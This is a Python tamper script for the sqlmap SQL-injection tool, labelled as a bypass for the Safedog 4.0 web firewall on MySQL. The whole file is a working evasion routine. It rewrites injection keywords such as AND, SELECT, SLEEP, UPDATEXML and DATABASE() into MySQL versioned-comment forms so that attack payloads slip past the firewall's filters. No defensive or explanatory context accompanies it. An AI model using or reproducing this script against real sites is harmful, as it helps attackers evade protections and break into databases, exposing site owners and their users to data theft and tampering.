#!/usr/bin/env python


import re
import os

from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass safedog4.0'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
        payload=payload.replace('AND','/*!11440AND*/')
        payload=payload.replace('ORDER','order/*!77777cz*/')
        payload=payload.replace("SELECT","/*!11440SELECT*/")
        payload=payload.replace("SLEEP(","sleep/*!77777cz*/(")
        payload=payload.replace("UPDATEXML(","UPDATEXML/*!77777cz*/(")
        payload=payload.replace("SESSION_USER()","/*!11440SESSION_USER()*/")
        payload=payload.replace("USER())","USER/*!77777cz*/())")
        payload=payload.replace("DATABASE()","DATABASE/*!77777cz*/()")
        return payload